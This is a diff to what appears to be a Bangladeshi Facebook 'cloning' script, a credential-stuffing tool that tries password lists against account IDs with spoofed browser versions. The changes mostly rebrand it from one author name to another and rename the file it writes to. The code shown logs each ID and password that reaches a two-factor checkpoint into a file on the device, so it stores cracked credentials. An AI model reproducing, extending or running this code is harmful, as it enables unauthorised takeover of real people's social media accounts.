@@ -137,7 +137,7 @@ logo = f'''\r\r\x1b[0;92m
 \x1b[10;93m╠══[SEND BY                    • \x1b[1;38mAR RAHIM KING]     ║ 
 \x1b[10;91m╠══[TELIGERM                  • king Cloning Family]   ║    
 \x1b[10;97m╠══[Github                   • AR Rahim-King ]   ║   
-\x1b[10;94m╠══[All X GF                  •Rotna,Bithi,Sadia,Adiba ]  ║ 
+\x1b[10;94m╠══[All X GF                  •Rotna,Bithi,Sadia,Soma ║ 
 \x1b[10;95m╠══[TOOLS                    • FREE ]         ║    
 \x1b[10;93m╠══[VERSION                  • 11.2.1 ]          ║ \x1b[10;92m
 \x1b[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\x1b[1;31m'''
@@ -190,7 +190,7 @@ def rmenu1():
 #------------------[ METHOD-1 ]-----------------#
 def graphrm(id,psd,tid):
     global ok,cp,lop
-    sys.stdout.write(f'''\r\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;97m[\x1b[10;92mTutul\x1b[10;97m-\x1b[10;92mM1\x1b[10;97m]>~[\x1b[10;92m{lop}\x1b[10;97m]>~<[\x1b[10;92m{tid}\x1b[10;97m]>~[\x1b[10;92mOK\x1b[10;91m•\x1b[10;92m%s\x1b[10;91m/\x1b[10;93m%s\x1b[10;97m] ''' % (len(ok), len(lk)));sys.stdout.flush()
+    sys.stdout.write(f'''\r\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;97m[\x1b[10;92mRahim\x1b[10;97m-\x1b[10;92mM1\x1b[10;97m]>~[\x1b[10;92m{lop}\x1b[10;97m]>~<[\x1b[10;92m{tid}\x1b[10;97m]>~[\x1b[10;92mOK\x1b[10;91m•\x1b[10;92m%s\x1b[10;91m/\x1b[10;93m%s\x1b[10;97m] ''' % (len(ok), len(lk)));sys.stdout.flush()
     for psw in psd:
         vchrome = str(random.randint(100, 925)) + '.0.0.' + str(random.randint(1, 8)) + '.' + str(random.randint(40, 150))
         VAPP = random.randint(410000000, 499999999)
@@ -219,9 +219,9 @@ def graphrm(id,psd,tid):
         else:
             if twfx in str(lo):
                 iid = lo['error']['error_data']['uid']
-                print(f'''\r\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;96m[Rahim-2F] {iid} | {psw}{W}''')
-                os.system('espeak -a 300 \"2F\"')
-                open('/sdcard/1T-2F.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '\n')
+                print(f'''\r\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;96m[Rahim-] {iid} | {psw}{W}''')
+                os.system('espeak -a 300 \"Rahim\"')
+                open('/sdcard/Rahim.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '\n')
                 twf.append(id)
                 break
             if 'www.facebook.com' in lo['error']['message']:
